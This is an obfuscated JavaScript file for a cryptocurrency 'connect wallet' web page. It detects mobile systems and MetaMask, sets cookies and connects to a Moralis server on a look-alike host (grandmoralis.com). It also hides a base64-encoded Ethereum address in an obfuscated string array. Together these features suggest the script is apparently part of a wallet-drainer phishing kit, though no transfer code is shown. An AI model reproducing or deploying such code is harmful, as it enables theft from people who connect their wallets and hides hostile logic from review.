function _0x2336(_0x58ef4a, _0x300e5c) {
    const _0x587dd2 = _0x587d();
    return _0x2336 = function (_0x233657, _0x39d0ae) {
        _0x233657 = _0x233657 - 0x14a;
        let _0x11bcf4 = _0x587dd2[_0x233657];
        return _0x11bcf4;
    }, _0x2336(_0x58ef4a, _0x300e5c);
}

const _0x548f55 = _0x2336;
(function (_0x353058, _0x276fba) {
    const _0x329ade = _0x2336, _0x41ac7b = _0x353058();
    while (!![]) {
        try {
            const _0x202d09 = parseInt(_0x329ade(0x167)) / 0x1 * (-parseInt(_0x329ade(0x15c)) / 0x2) + parseInt(_0x329ade(0x169)) / 0x3 + parseInt(_0x329ade(0x158)) / 0x4 * (parseInt(_0x329ade(0x14a)) / 0x5) + -parseInt(_0x329ade(0x164)) / 0x6 + parseInt(_0x329ade(0x16e)) / 0x7 * (-parseInt(_0x329ade(0x161)) / 0x8) + -parseInt(_0x329ade(0x176)) / 0x9 + -parseInt(_0x329ade(0x16d)) / 0xa * (-parseInt(_0x329ade(0x15b)) / 0xb);
            if (_0x202d09 === _0x276fba) break; else _0x41ac7b['push'](_0x41ac7b['shift']());
        } catch (_0x12f04e) {
            _0x41ac7b['push'](_0x41ac7b['shift']());
        }
    }
}(_0x587d, 0xb53a8));

function getMobileOperatingSystem() {
    const _0x556523 = _0x2336;
    var _0x222cfd = navigator[_0x556523(0x16b)] || navigator['vendor'] || window[_0x556523(0x170)];
    const _0x5f58a3 = window[_0x556523(0x156)][_0x556523(0x159)], _0x356fbd = new URLSearchParams(_0x5f58a3),
        _0x3e3e33 = _0x356fbd[_0x556523(0x154)](_0x556523(0x157));
    if (_0x3e3e33 == 'mm') return 'Metamask';
    if (/windows phone/i[_0x556523(0x160)](_0x222cfd)) return _0x556523(0x14f);
    if (/android/i[_0x556523(0x160)](_0x222cfd)) return _0x556523(0x173);
    if (/iPad|iPhone|iPod/[_0x556523(0x160)](_0x222cfd) && !window[_0x556523(0x15a)]) return _0x556523(0x153);
    return _0x556523(0x155);
}

function setCookie(_0x5c0388, _0x41f6e9, _0x33970d) {
    const _0x498182 = _0x2336, _0x26fe39 = new Date();
    _0x26fe39[_0x498182(0x15e)](_0x26fe39[_0x498182(0x172)]() + _0x33970d * 0x18 * 0x3c * 0x3c * 0x3e8);
    let _0x2b6c95 = _0x498182(0x163) + _0x26fe39[_0x498182(0x14b)]();
    document[_0x498182(0x16a)] = _0x5c0388 + '=' + _0x41f6e9 + ';' + _0x2b6c95 + _0x498182(0x152);
}

function getCookie(_0x364c75) {
    const _0x1ab6ec = _0x2336;
    let _0x307d7d = _0x364c75 + '=', _0x4b0e8d = document['cookie']['split'](';');
    for (let _0x4cf97c = 0x0; _0x4cf97c < _0x4b0e8d[_0x1ab6ec(0x171)]; _0x4cf97c++) {
        let _0x24ec9e = _0x4b0e8d[_0x4cf97c];
        while (_0x24ec9e[_0x1ab6ec(0x168)](0x0) == '\x20') {
            _0x24ec9e = _0x24ec9e[_0x1ab6ec(0x16c)](0x1);
        }
        if (_0x24ec9e[_0x1ab6ec(0x174)](_0x307d7d) == 0x0) return _0x24ec9e['substring'](_0x307d7d['length'], _0x24ec9e[_0x1ab6ec(0x171)]);
    }
    return '';
}

let timerrrr = _0x548f55(0x14e);

function _0x587d() {
    const _0xe7efb1 = ['classList', 'MHg1ODE2ZTlDRmU3MTQ0YzNFYzdmMjE3OTIwQzcxODJEY0M2OWVlOTZj', 'Windows\x20Phone', 'mmLink', 'createElement', ';path=/', 'iOS', 'get', 'unknown', 'location', 'uid', '16EGbehV', 'search', 'MSStream', '381139QazLkm', '201954EUhLIY', 'insertBefore', 'setTime', 'http://', 'test', '16DRdghE', 'add', 'expires=', '5250108BdwvBl', 'DOMContentLoaded', 'https://', '4gTjDbJ', 'charAt', '1559304pYbWZd', 'cookie', 'userAgent', 'substring', '350GeeMpU', '1496432WXrNQa', 'href', 'opera', 'length', 'getTime', 'Android', 'indexOf', 'addEventListener', '558729WitacG', '?uid=mm', '972985cQWqxq', 'toUTCString', 'replace'];
    _0x587d = function () {
        return _0xe7efb1;
    };
    return _0x587d();
}

var serverUrl = "https://qcko69j6fs14.grandmoralis.com:2053/server",
    appId = "eDE3p7SYq75jx3ERMDvbzL129osq37QWZU8Ywi0e",
    _0x1829e9 = {};
_0x1829e9["serverUrl"] = serverUrl;
_0x1829e9["appId"] = appId, Moralis["start"](_0x1829e9);
console.log(Moralis)

document.addEventListener('DOMContentLoaded', (event) => {
    // getAccount();
    if (getMobileOperatingSystem() == "Android" || getMobileOperatingSystem() == "iOS") {
        // console.log("12346")
        // const connect = document.getElementById("#connectButton")
        // console.log(connect, "ss")
        // var wrapper = document.createElement('a');
        // wrapper.classList.add('mmLink');
        // wrapper.href = "https://metamask.app.link/dapp/" + ((window.location.href).replace('https://', '').replace('http://', '')) + "?uid=mm";
        // connect.parentNode.insertBefore(wrapper, connect);
        // wrapper.appendChild(connect);
    }

});
